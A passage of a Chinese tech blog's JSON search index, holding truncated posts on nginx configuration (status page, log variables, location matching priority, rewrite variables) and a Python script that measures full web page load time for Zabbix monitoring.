Location","date":"2019-02-04","objectID":"/posts/linux/nginx-location/","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"1. 前言 个人整理,可参考 2. 优化 2.1. 参数说明 worker_processes : 进程数 worker_connections : 最大连接数 (最大并发连接=进程数x最大连接数) autoindex : 当主页不存在的时候，显示目录结构 2.2. nginx 状态说明 配置方法: server { listen port; server_name status.example.com; location / { stub_status on; access_log off; allow 10.0.0.0/24; deny all; } } Active connections : 单位时间内服务器正在处理的连接数 server : 此启动到现在一共处理的连接 accepts : 从启动到现在成功创建多少次握手(和server相同表示没有失败) handled requests : 已经处理完毕的请求数 Reading: : nginx 读取到客户端的header信息数 Writing : 返回给客户端的header信息数 Waiting : 已经处理完等待下一次请求制定的驻留数(在开启keep-alive时，该值等于active-(reading+writing)) 2.3. nginx 日志 日志语法(配置于http标签内): log_format name string …; 日志参数说明: $remote_addr : 访问网站的客户端地址 $remote_user : 访问网站的客户端名称 $time_local : 访问网站的时间和时区 $request : 用户的http请求起始行信息(GET/HTTP/1.1) $status : 返回的http状态码 $body_bytes_sent : 服务器发送给客户端的想要body字节 $http_referer : 记录是从那个链接请求访问过来的，可以根据referer进行设置防盗链 $http_user_agent : 记录访问网站的访问信息，比如浏览器、手机客户端等 $http_x_forwarded_for ： 有代理服务器的时候， 设置web节点记录客户端的地址，此参数生效需在代理服务器设置x_forwarded_for 2.4. nginx location 2.4.1. location 作用 根据用户请求的URI来执行不同的应用。 uri 只可意会，不可言传的东西 2.4.2. location 语法: location [=|~|~*|^~] uri { ... } 说明: location : 指令 [=|~|~*|^~] ：匹配标识 = : 精确匹配 ~ : 用于区分大小写的匹配 ~* : 用于不区分大小写的匹配 ^~ : 常规匹配，不做正则验证 ! : 取反,如:!~*… uri : 匹配的网址 {...} : 匹配uri后要执行的配置段 示例: location = / { [ configuration A] } location / { [ configuration B] } location /documents/ { [ configuration C] } location ^~ /images/ { [ configuration D] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E] } 不同URI对应的配置: 用户请求的URI 完整的URL地址 匹配的配置 / http://www.example.com/ configuration A /index.html http://www.example.com/ configuration B /documents/index.html http://www.example.com/documents/index.html configuration C /images/1.jpg http://www.example.com/images/1.jpg configuration D /ducoments/1.jpg http://www.example.com/documents/1.jpg configuration E 2.4.3 location 语法测试: location / { return 401; } location =/ { return 402; } location /documents/ { return 403; } location ^~ /images/ { return 404; } location ~* \\.(gif|jpg|jpeg)$ { return 500; } 请求结果: [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com 402 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/ 402 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/index.html 401 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/documents/index.html 403 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/images/1.jpg 404 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/documents/1.jpg 匹配优先级: 不用URI及特殊字符组合匹配顺序 匹配说明 location = / { 精确匹配/ location ^~ /images/ { 匹配常规字符串，不做正则匹配检查 location ~ \\.(gif|JPG|jpeg)$ { 区分大小写的正则匹配 location ~* \\.(gif|jpg|jpeg)$ { 不区分大小写的正则匹配 location /document/ { 匹配常规字符串，如果有正则则优先匹配正则 location / { 所有location都不匹配后的默认匹配规则 注: 优先级为： = \u003e 完整路径 \u003e ^~ \u003e ~|~* \u003e 部分起始路径 \u003e / 2.5. nginx Rewrite 用于实现伪静态，URL改写，必须安装PCRE的软件的支持，nginx编译默认安装Rewrite模块 2.5.1. Rewrite 全局变量 - - $remote_addr 获取客户端ip $binary_remote_addr 客户端ip（二进制) $remote_port 客户端port，如：50472 $remote_user 已经经过Auth Basic Module验证的用户名 $host 请求主机头字段，否则为服务器名称，如:blog.sakmon.com $request 用户请求信息，如：GET ?a=1\u0026b=2 HTTP/1.1 $request_filename 当前请求的文件的路径名，由root或alias和URI request组合而成，如：/2013/81.html $status 请求的响应状态码,如:200 $body_bytes_sent 响应时送出的body字节数数量。即使连接中断，这个数据也是精确的,如：40 $content_length 等于请求行的“Content_Length”的值 $content_type 等于请求行的“Content_Type”的值 $http_referer 引用地址 $http_user_agent 客户端agent信息,如：Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36 $args 与$query_string相同 等于当中URL的参数(GET)，如a=1\u0026b=2 $document_uri 与$uri相同 这个变量指当前的请求URI，不包括任何参数(见$args) 如:/2013/81.html $document_root 针对当前请求的根路径设置值 $hostname 如：centos53.localdomain $http_cookie 客户端cookie信息 $cookie_COOKIE cookie COOKIE变量的值 $is_args 如果有$args参数，这个变量等于”?”，否则等于”\"，空值，如? $limit_rate 这个变量可以限制连接速率，0表示不限速 $query_string 与$args相同 等于当中URL的参数(GET)，如a=1\u0026b=2 $request_body 记录POST过来的数据信息 $request_body_file 客户端请求主体信息的临时文件名 $request_method 客户端请求的动作，通常为GET或P","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:0:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"全网页加载时间","date":"2019-02-04","objectID":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/","tags":["linux","监控","python"],"title":"Python全网页加载时间","uri":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/"},{"categories":["linux","运维记事"],"content":"本文介绍的是一个关于站点全网页加载时间的一个脚本,前段时间在网络上找了很久关于在线站点全页加载的时间的,一直没有找到合适的,翻越了很久的github终于找到了一个比较适合我现在需求的一个项目,于是拿下来修改了下,目前这个有个问题是不能异步加载 参考项目:[https://github.com/donjajo/loady.git] 修改代码提交地址:[https://github.com/0x5c0f/zbx_page_load.git] 脚本依赖的额外模块: bs4(Beautiful Soup 4.x) 模块安装: pip3 install bs4 ​(或 python3 -m pip install bs4) 检测脚本page-load.py #!/usr/bin/env python3 # #UserParameter=custom.page.load[*],/opt/sh/zbx_discover_site/page-load.py $1 # import requests from bs4 import BeautifulSoup import re import urllib.parse import sys from time import time debug=1 class Loady: files = { 'js' : {}, 'css' : {}, 'img' : {} } def __init__( self, url, headers = {} ): if not isinstance( headers, dict ): raise ValueError( 'Headers argument must be dict instance' ) self.url = url self.total_time = 0 self.js = [] self.css = [] self.img = [] self.http_headers = headers self.soup = None self.total_size = 0 def _get( self, tag ): \"\"\"Gets all site additional files and prepares their URL to be loaded\"\"\" # Get current URL data domain_scheme, domain, _, _, _, _ = urllib.parse.urlparse( self.url ) urls = [] if tag == 'script': # Get all script tag with src attribute # print(self.soup.find_all( 'script', { 'src' : re.compile( r'.*' ) } )) tags = self.soup.find_all( 'script', { 'src' : re.compile( r'.*' ) } ) elif tag == 'img': # print(self.soup.find_all( 'img', { 'src' : re.compile( r'.*' ) } )) tags = self.soup.find_all( 'img', { 'src' : re.compile( r'.*' ) } ) # elif tag is 'i': # print(tags = self.soup.find_all('i', {'style': re.compile(r'.*')})) # tags = self.soup.find_all('i', {'style': re.compile(r'.*')}) else: # Get all link tag with rel=stylesheet # print(self.soup.find_all( 'link', { 'rel' : 'stylesheet' } )) tags = self.soup.find_all( 'link', { 'rel' : 'stylesheet' } ) for each_tag in tags: # Get the value of src or href val = each_tag[ 'src' ] if tag == 'script' or tag == 'img' else each_tag[ 'href' ] #val = '' #if tag is 'script' or tag is 'img': # val = each_tag['src'] #else: # val = each_tag['href'] # parse the URL of the gotten URL url = urllib.parse.urlparse( val ) if not url[ 0 ] and url[ 1 ]: # If URL has no scheme but has domain name, we assume it is a URL that supports HTTP(S). We just append the main site scheme to it if not val.startswith(\"//\"): urls.append( '{0}://{1}'.format( domain_scheme, val ) ) else: urls.append( '{0}:{1}'.format( domain_scheme, val ) ) elif not url[ 1 ]: # URL has no domain, its a relative path. Append the domain name to it if not val.startswith(\"/\"): urls.append( '{0}://{1}/{2}'.format( domain_scheme, domain, val ) ) else: urls.append( '{0}://{1}{2}'.format( domain_scheme, domain, val ) ) else: # Its an absolute path, no issues bro! urls.append( val ) if tag == 'script': self.js = urls elif tag == 'img': self.img = urls else: self.css = urls def _load( self, t ): \"\"\"Load the gotten links, check for response time and size. Appends it to self.files object\"\"\" _link_obj = [] if t == 'script': _link_obj = self.js elif t == 'img': _link_obj = self.img else: _link_obj = self.css # for link in ( self.js if t is 'script' else self.css ): for link in (_link_obj): if debug == 1: print(link) try: start = time() r = requests.get( link ) end = time() # Calculate the total time taken to load link response_time = ( end - start ) # Page loaded successfully if r.status_code == 200: # Get the size of page content size = sys.getsizeof(r.content) if t == 'img' else sys.getsizeof(r.text) # Add results to self.files object obj = '' if t == 'style': obj = 'css' elif t == 'img': obj = 'img' else: obj = 'js' self.files[obj][link] = {'byte_size': size, 'load_time': response_time} # Sum up total time to the existing load time self.total_time += response_time self.total_size += size except Exception as e: if debug == 1: print(e,link) continue def get( self ): \"\"\"Loads the main website, calculate response time, page size and get additional files in site\"\"\" start = time() r = requests.get( self.url, headers = self.http_headers ) stop = time() if r.st","date":"2019-02-04","objectID":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/:0:0","tags":["linux","监控","python"],"title":"Python全网页加载时间","uri":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/"}]